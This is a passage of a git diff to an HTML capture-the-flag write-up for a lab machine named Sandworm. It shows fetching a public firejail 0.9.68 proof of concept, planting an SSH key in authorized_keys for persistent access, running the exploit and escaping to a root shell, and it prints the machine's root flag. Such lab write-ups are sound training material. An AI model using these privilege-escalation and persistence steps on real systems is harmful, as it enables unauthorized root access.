+<div class="highlight"><pre><span></span><span class="nd">atlas@sandworm</span><span class="p">:</span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">tipnet</span><span class="err">$</span> <span class="nb">id</span>
 <span class="n">uid</span><span class="o">=</span><span class="mi">1000</span><span class="p">(</span><span class="n">atlas</span><span class="p">)</span> <span class="n">gid</span><span class="o">=</span><span class="mi">1000</span><span class="p">(</span><span class="n">atlas</span><span class="p">)</span> <span class="n">groups</span><span class="o">=</span><span class="mi">1000</span><span class="p">(</span><span class="n">atlas</span><span class="p">),</span><span class="mi">1002</span><span class="p">(</span><span class="n">jailer</span><span class="p">)</span>
-<span class="nd">@atlas@sandworm</span><span class="p">:</span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">tipnet</span><span class="err">$</span>
+<span class="nd">atlas@sandworm</span><span class="p">:</span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">tipnet</span><span class="err">$</span>
 </pre></div>
 
 Recalling the <code>Set-UID</code> files, firejail was present in the system and was only available for users belonging to the <code>jailer</code> group:<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@atlas@sandworm</span><span class="p">:</span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">tipnet</span><span class="err">$</span> <span class="n">which</span> <span class="n">firejail</span> <span class="o">|</span> <span class="n">xargs</span> <span class="n">ls</span> <span class="o">-</span><span class="n">l</span>
+<div class="highlight"><pre><span></span><span class="nd">atlas@sandworm</span><span class="p">:</span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">tipnet</span><span class="err">$</span> <span class="n">which</span> <span class="n">firejail</span> <span class="o">|</span> <span class="n">xargs</span> <span class="n">ls</span> <span class="o">-</span><span class="n">l</span>
 <span class="o">-</span><span class="n">rwsr</span><span class="o">-</span><span class="n">x</span><span class="o">---</span> <span class="mi">1</span> <span class="n">root</span> <span class="n">jailer</span> <span class="mi">1777952</span> <span class="n">Nov</span> <span class="mi">29</span>  <span class="mi">2022</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">firejail</span>
-<span class="nd">@atlas@sandworm</span><span class="p">:</span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">tipnet</span><span class="err">$</span>
+<span class="nd">atlas@sandworm</span><span class="p">:</span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">tipnet</span><span class="err">$</span>
 </pre></div>
 
 Let's check the version of firejail:<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@atlas@sandworm</span><span class="p">:</span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">tipnet</span><span class="err">$</span> <span class="n">firejail</span> <span class="o">--</span><span class="n">version</span>
+<div class="highlight"><pre><span></span><span class="nd">atlas@sandworm</span><span class="p">:</span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">tipnet</span><span class="err">$</span> <span class="n">firejail</span> <span class="o">--</span><span class="n">version</span>
 <span class="n">firejail</span> <span class="n">version</span> <span class="mf">0.9.68</span>
 
 <span class="n">Compile</span> <span class="n">time</span> <span class="n">support</span><span class="p">:</span>
@@ -953,7 +953,7 @@ Let's check the version of firejail:<br/><br/>
     <span class="o">-</span> <span class="n">user</span> <span class="n">namespace</span> <span class="n">support</span> <span class="ow">is</span> <span class="n">enabled</span>
     <span class="o">-</span> <span class="n">X11</span> <span class="n">sandboxing</span> <span class="n">support</span> <span class="ow">is</span> <span class="n">enabled</span>
 
-<span class="nd">@atlas@sandworm</span><span class="p">:</span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">tipnet</span><span class="err">$</span>
+<span class="nd">atlas@sandworm</span><span class="p">:</span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">tipnet</span><span class="err">$</span>
 </pre></div>
 
 After conducting some research on the internet, I discovered a vulnerability associated with this version.<br/><br/>
@@ -961,7 +961,7 @@ There is an advisory on GitHub regarding this vulnerability: <a href="https://gi
 <em>A Privilege Context Switching issue was discovered in join.c in Firejail 0.9.68. By crafting a bogus Firejail container that is accepted by the Firejail setuid-root program as a join target, a local attacker can enter an environment in which the Linux user namespace is still the initial user namespace, the NO_NEW_PRIVS prctl is not activated, and the entered mount namespace is under the attacker's control. In this way, the filesystem layout can be adjusted to gain root privileges through execution of available setuid-root binaries such as su or sudo.</em><br/><br/>
 I also came across the following <a href="https://www.openwall.com/lists/oss-security/2022/06/08/10">article</a>, which details the vulnerability. The article includes a PoC exploit in this <a href="https://www.openwall.com/lists/oss-security/2022/06/08/10/1">section</a>.<br/><br/>
 Let's proceed to exploit this vulnerability. First, I will download the exploit on my local machine:<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">wget</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">www</span><span class="o">.</span><span class="n">openwall</span><span class="o">.</span><span class="n">com</span><span class="o">/</span><span class="n">lists</span><span class="o">/</span><span class="n">oss</span><span class="o">-</span><span class="n">security</span><span class="o">/</span><span class="mi">2022</span><span class="o">/</span><span class="mi">06</span><span class="o">/</span><span class="mi">08</span><span class="o">/</span><span class="mi">10</span><span class="o">/</span><span class="mi">1</span> <span class="o">-</span><span class="n">O</span> <span class="n">exploit</span><span class="o">.</span><span class="n">py</span>
+<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">wget</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">www</span><span class="o">.</span><span class="n">openwall</span><span class="o">.</span><span class="n">com</span><span class="o">/</span><span class="n">lists</span><span class="o">/</span><span class="n">oss</span><span class="o">-</span><span class="n">security</span><span class="o">/</span><span class="mi">2022</span><span class="o">/</span><span class="mi">06</span><span class="o">/</span><span class="mi">08</span><span class="o">/</span><span class="mi">10</span><span class="o">/</span><span class="mi">1</span> <span class="o">-</span><span class="n">O</span> <span class="n">exploit</span><span class="o">.</span><span class="n">py</span>
 <span class="o">--</span><span class="mi">2023</span><span class="o">-</span><span class="mi">11</span><span class="o">-</span><span class="mi">18</span> <span class="mi">19</span><span class="p">:</span><span class="mi">45</span><span class="p">:</span><span class="mi">31</span><span class="o">--</span>  <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">www</span><span class="o">.</span><span class="n">openwall</span><span class="o">.</span><span class="n">com</span><span class="o">/</span><span class="n">lists</span><span class="o">/</span><span class="n">oss</span><span class="o">-</span><span class="n">security</span><span class="o">/</span><span class="mi">2022</span><span class="o">/</span><span class="mi">06</span><span class="o">/</span><span class="mi">08</span><span class="o">/</span><span class="mi">10</span><span class="o">/</span><span class="mi">1</span>
 <span class="n">Resolving</span> <span class="n">www</span><span class="o">.</span><span class="n">openwall</span><span class="o">.</span><span class="n">com</span> <span class="p">(</span><span class="n">www</span><span class="o">.</span><span class="n">openwall</span><span class="o">.</span><span class="n">com</span><span class="p">)</span><span class="o">...</span> <span class="mf">195.42.179.202</span>
 <span class="n">Connecting</span> <span class="n">to</span> <span class="n">www</span><span class="o">.</span><span class="n">openwall</span><span class="o">.</span><span class="n">com</span> <span class="p">(</span><span class="n">www</span><span class="o">.</span><span class="n">openwall</span><span class="o">.</span><span class="n">com</span><span class="p">)</span><span class="o">|</span><span class="mf">195.42.179.202</span><span class="o">|</span><span class="p">:</span><span class="mf">443.</span><span class="o">..</span> <span class="n">connected</span><span class="o">.</span>
@@ -976,7 +976,7 @@ Let's proceed to exploit this vulnerability. First, I will download the exploit 
 
 Before executing the exploit on the victim machine, I recommend obtaining a second shell as <code>atlas</code>, as you will need a second terminal to exploit the vulnerability.<br/><br/>
 You can send another reverse shell by manipulating the SSH <code>authorized_keys</code> file. First, generate new SSH keys:<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">ssh</span><span class="o">-</span><span class="n">keygen</span>
+<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">ssh</span><span class="o">-</span><span class="n">keygen</span>
 <span class="n">Generating</span> <span class="n">public</span><span class="o">/</span><span class="n">private</span> <span class="n">rsa</span> <span class="n">key</span> <span class="n">pair</span><span class="o">.</span>
 <span class="n">Enter</span> <span class="n">file</span> <span class="ow">in</span> <span class="n">which</span> <span class="n">to</span> <span class="n">save</span> <span class="n">the</span> <span class="n">key</span> <span class="p">(</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">elswix</span><span class="o">/.</span><span class="n">ssh</span><span class="o">/</span><span class="n">id_rsa</span><span class="p">):</span> 
 <span class="n">Enter</span> <span class="n">passphrase</span> <span class="p">(</span><span class="n">empty</span> <span class="k">for</span> <span class="n">no</span> <span class="n">passphrase</span><span class="p">):</span> 
@@ -1000,12 +1000,12 @@ You can send another reverse shell by manipulating the SSH <code>authorized_keys
 </pre></div>
 
 After that, copy the public key and save it as an <code>authorized_keys</code> file on the victim machine:<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@atlas@sandworm</span><span class="p">:</span><span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">shm</span><span class="err">$</span> <span class="n">echo</span> <span class="s1">'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCm6SAEfouJqmdkjQ9xfzlb+g+pff/BS5sHIkPfir/KqDSR0V4TRCwKrpzs3J7ZilhvjurIFPoi5PA0wcX/9Sh8snmeh9yrQD1aJGZNBLGB//wX0j/r5vA6FSdRRA+6V2tyxmb4W/IbpBtePcSqGh7sGn1TzysyudMml3RUEPSOeUnBbFvLimm6etauY6VfTn6X2+P8SPT2+7QR+5HeBh88fs6z3P4Z9axWZ/8rRBE0zSR5UJijv1O8FwsLSoLX/KpJiADNcBrMLxxq2TRkVVYjJd2K4uwsJDg9XxTGgId9jzw3nnbyVS2ld0zDSV+D5mZa4lwErgkkYb5S+O/Ol3Uec8OnkVsRQV5I4JmBpMW3suess03BzT7osQIDzoyI7H3RjRTeD6SGhlpWf1yFWt2LZc/SXHXCa3oAk9RRPAMXigKJQIdcNI897Zhci6iN7Pv7JyutgXTNCimX2jnqo6H572CqkLUtBGjAaistcJVnqBjWW1RI6krpsOuIgSpCTYs= elswix@kali'</span> <span class="o">&gt;</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">atlas</span><span class="o">/.</span><span class="n">ssh</span><span class="o">/</span><span class="n">authorized_keys</span> 
-<span class="nd">@atlas@sandworm</span><span class="p">:</span><span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">shm</span><span class="err">$</span>
+<div class="highlight"><pre><span></span><span class="nd">atlas@sandworm</span><span class="p">:</span><span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">shm</span><span class="err">$</span> <span class="n">echo</span> <span class="s1">'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCm6SAEfouJqmdkjQ9xfzlb+g+pff/BS5sHIkPfir/KqDSR0V4TRCwKrpzs3J7ZilhvjurIFPoi5PA0wcX/9Sh8snmeh9yrQD1aJGZNBLGB//wX0j/r5vA6FSdRRA+6V2tyxmb4W/IbpBtePcSqGh7sGn1TzysyudMml3RUEPSOeUnBbFvLimm6etauY6VfTn6X2+P8SPT2+7QR+5HeBh88fs6z3P4Z9axWZ/8rRBE0zSR5UJijv1O8FwsLSoLX/KpJiADNcBrMLxxq2TRkVVYjJd2K4uwsJDg9XxTGgId9jzw3nnbyVS2ld0zDSV+D5mZa4lwErgkkYb5S+O/Ol3Uec8OnkVsRQV5I4JmBpMW3suess03BzT7osQIDzoyI7H3RjRTeD6SGhlpWf1yFWt2LZc/SXHXCa3oAk9RRPAMXigKJQIdcNI897Zhci6iN7Pv7JyutgXTNCimX2jnqo6H572CqkLUtBGjAaistcJVnqBjWW1RI6krpsOuIgSpCTYs= elswix@kali'</span> <span class="o">&gt;</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">atlas</span><span class="o">/.</span><span class="n">ssh</span><span class="o">/</span><span class="n">authorized_keys</span> 
+<span class="nd">atlas@sandworm</span><span class="p">:</span><span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">shm</span><span class="err">$</span>
 </pre></div>
 
 Now, you can access as "atlas" through SSH without specifying credentials:<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">ssh</span> <span class="n">atlas</span><span class="o">@</span><span class="mf">10.10.11.218</span>
+<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">ssh</span> <span class="n">atlas</span><span class="o">@</span><span class="mf">10.10.11.218</span>
 <span class="n">Welcome</span> <span class="n">to</span> <span class="n">Ubuntu</span> <span class="mf">22.04.2</span> <span class="n">LTS</span> <span class="p">(</span><span class="n">GNU</span><span class="o">/</span><span class="n">Linux</span> <span class="mf">5.15.0</span><span class="o">-</span><span class="mi">73</span><span class="o">-</span><span class="n">generic</span> <span class="n">x86_64</span><span class="p">)</span>
 
  <span class="o">*</span> <span class="n">Documentation</span><span class="p">:</span>  <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">help</span><span class="o">.</span><span class="n">ubuntu</span><span class="o">.</span><span class="n">com</span>
@@ -1038,53 +1038,53 @@ Now, you can access as "atlas" through SSH without specifying credentials:<br/><
 
 
 <span class="n">Last</span> <span class="n">login</span><span class="p">:</span> <span class="n">Sat</span> <span class="n">Nov</span> <span class="mi">18</span> <span class="mi">22</span><span class="p">:</span><span class="mi">48</span><span class="p">:</span><span class="mi">37</span> <span class="mi">2023</span> <span class="kn">from</span> <span class="mf">10.10.16.7</span>
-<span class="nd">@atlas@sandworm</span><span class="p">:</span><span class="o">~</span><span class="err">$</span>
+<span class="nd">atlas@sandworm</span><span class="p">:</span><span class="o">~</span><span class="err">$</span>
 </pre></div>
 
 After uploading the exploit to the victim machine, let's execute it:<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@atlas@sandworm</span><span class="p">:</span><span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">shm</span><span class="err">$</span> <span class="n">python3</span> <span class="n">exploit</span><span class="o">.</span><span class="n">py</span>
+<div class="highlight"><pre><span></span><span class="nd">atlas@sandworm</span><span class="p">:</span><span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">shm</span><span class="err">$</span> <span class="n">python3</span> <span class="n">exploit</span><span class="o">.</span><span class="n">py</span>
 <span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">shm</span><span class="o">/</span><span class="n">exploit</span><span class="o">.</span><span class="n">py</span> <span class="n">needs</span> <span class="n">to</span> <span class="n">have</span> <span class="n">the</span> <span class="n">execute</span> <span class="n">bit</span> <span class="nb">set</span> <span class="k">for</span> <span class="n">the</span> <span class="n">exploit</span> <span class="n">to</span> <span class="n">work</span><span class="o">.</span> <span class="n">Run</span> <span class="err">`</span><span class="n">chmod</span> <span class="o">+</span><span class="n">x</span> <span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">shm</span><span class="o">/</span><span class="n">exploit</span><span class="o">.</span><span class="n">py</span><span class="err">`</span> <span class="ow">and</span> <span class="k">try</span> <span class="n">again</span><span class="o">.</span>
-<span class="nd">@atlas@sandworm</span><span class="p">:</span><span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">shm</span><span class="err">$</span>
+<span class="nd">atlas@sandworm</span><span class="p">:</span><span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">shm</span><span class="err">$</span>
 </pre></div>
 
 It appears that the program requires execution privileges to work.<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@atlas@sandworm</span><span class="p">:</span><span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">shm</span><span class="err">$</span> <span class="n">chmod</span> <span class="o">+</span><span class="n">x</span> <span class="n">exploit</span><span class="o">.</span><span class="n">py</span>
+<div class="highlight"><pre><span></span><span class="nd">atlas@sandworm</span><span class="p">:</span><span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">shm</span><span class="err">$</span> <span class="n">chmod</span> <span class="o">+</span><span class="n">x</span> <span class="n">exploit</span><span class="o">.</span><span class="n">py</span>
 </pre></div>
 
 Now, let's try to execute it:<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@atlas@sandworm</span><span class="p">:</span><span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">shm</span><span class="err">$</span> <span class="o">./</span><span class="n">exploit</span><span class="o">.</span><span class="n">py</span> 
+<div class="highlight"><pre><span></span><span class="nd">atlas@sandworm</span><span class="p">:</span><span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">shm</span><span class="err">$</span> <span class="o">./</span><span class="n">exploit</span><span class="o">.</span><span class="n">py</span> 
 <span class="n">You</span> <span class="n">can</span> <span class="n">now</span> <span class="n">run</span> <span class="s1">'firejail --join=22803'</span> <span class="ow">in</span> <span class="n">another</span> <span class="n">terminal</span> <span class="n">to</span> <span class="n">obtain</span> <span class="n">a</span> <span class="n">shell</span> <span class="n">where</span> <span class="s1">'sudo su -'</span> <span class="n">should</span> <span class="n">grant</span> <span class="n">you</span> <span class="n">a</span> <span class="n">root</span> <span class="n">shell</span><span class="o">.</span>
 </pre></div>
 
 It works, and it suggests that in another terminal, we can obtain a root shell using <code>sudo su -</code>. First, we need to attach to that process ID:<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@atlas@sandworm</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">firejail</span> <span class="o">--</span><span class="n">join</span><span class="o">=</span><span class="mi">22803</span>
+<div class="highlight"><pre><span></span><span class="nd">atlas@sandworm</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">firejail</span> <span class="o">--</span><span class="n">join</span><span class="o">=</span><span class="mi">22803</span>
 <span class="n">changing</span> <span class="n">root</span> <span class="n">to</span> <span class="o">/</span><span class="n">proc</span><span class="o">/</span><span class="mi">22803</span><span class="o">/</span><span class="n">root</span>
 <span class="ne">Warning</span><span class="p">:</span> <span class="n">cleaning</span> <span class="nb">all</span> <span class="n">supplementary</span> <span class="n">groups</span>
 <span class="n">Child</span> <span class="n">process</span> <span class="n">initialized</span> <span class="ow">in</span> <span class="mf">11.35</span> <span class="n">ms</span>
-<span class="nd">@atlas@sandworm</span><span class="p">:</span><span class="o">~</span><span class="err">$</span>
+<span class="nd">atlas@sandworm</span><span class="p">:</span><span class="o">~</span><span class="err">$</span>
 </pre></div>
 
 Now, you can simply run the <code>su</code> command, and you will obtain a shell as root:<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@atlas@sandworm</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">su</span>
-<span class="nd">@root@sandworm</span><span class="p">:</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">atlas</span><span class="root1"># </span><span class="n">whoami</span>
+<div class="highlight"><pre><span></span><span class="nd">atlas@sandworm</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">su</span>
+<span class="nd">root@sandworm</span><span class="p">:</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">atlas</span><span class="root1"># </span><span class="n">whoami</span>
 <span class="n">root</span>
-<span class="nd">@root@sandworm</span><span class="p">:</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">atlas</span><span class="root1"># </span><span class="n">id</span>
+<span class="nd">root@sandworm</span><span class="p">:</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">atlas</span><span class="root1"># </span><span class="n">id</span>
 <span class="n">uid</span><span class="o">=</span><span class="mi">0</span><span class="p">(</span><span class="n">root</span><span class="p">)</span> <span class="n">gid</span><span class="o">=</span><span class="mi">0</span><span class="p">(</span><span class="n">root</span><span class="p">)</span> <span class="n">groups</span><span class="o">=</span><span class="mi">0</span><span class="p">(</span><span class="n">root</span><span class="p">)</span>
-<span class="nd">@root@sandworm</span><span class="p">:</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">atlas</span><span class="root1">#</span><span class="n"></span>
+<span class="nd">root@sandworm</span><span class="p">:</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">atlas</span><span class="root1">#</span><span class="n"></span>
 </pre></div>
 
 Finally, you will be able to read the last flag:<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@root@sandworm</span><span class="p">:</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">atlas</span><span class="root1">#</span><span class="n"> cd /root</span>
-<span class="nd">@root@sandworm</span><span class="p">:</span><span class="o">~</span><span class="root1">#</span><span class="n"> cat root.txt</span>
+<div class="highlight"><pre><span></span><span class="nd">root@sandworm</span><span class="p">:</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">atlas</span><span class="root1">#</span><span class="n"> cd /root</span>
+<span class="nd">root@sandworm</span><span class="p">:</span><span class="o">~</span><span class="root1">#</span><span class="n"> cat root.txt</span>
 <span class="mi">3498205</span><span class="n">da1d717f043d4a64415b1b8f3</span>
-<span class="nd">@root@sandworm</span><span class="p">:</span><span class="o">~</span><span class="root1">#</span><span class="n"></span>
+<span class="nd">root@sandworm</span><span class="p">:</span><span class="o">~</span><span class="root1">#</span><span class="n"></span>
 </pre></div></br></br></br></br></br></br></br></br></br></br></br>
             </div>
         </div>
     </section>
 
     <footer>
-        <p>&copy; 2023 elswix.github.io</p>
+        <p>&copy; 2024 elswix.github.io</p>
     </footer>
 </body>
 </html>
